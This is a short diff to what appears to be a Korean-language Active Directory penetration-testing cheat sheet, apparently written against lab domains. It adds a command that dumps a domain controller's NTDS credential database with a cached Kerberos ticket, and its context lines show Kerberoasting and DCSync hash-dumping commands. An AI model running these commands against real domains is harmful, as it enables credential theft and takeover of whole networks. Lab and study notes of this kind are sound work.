@@ -588,6 +588,9 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfre
 ```bash
 nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds
 
+# CIFS Kerberos 티켓으로 NTDS 덤프
+KRB5CCNAME=Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache nxc smb dc.phantom.vl --use-kcache --ntds
+
 # DC로부터 모든 해시 덤프 (DCSync 권한 필요)
 secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
 ```
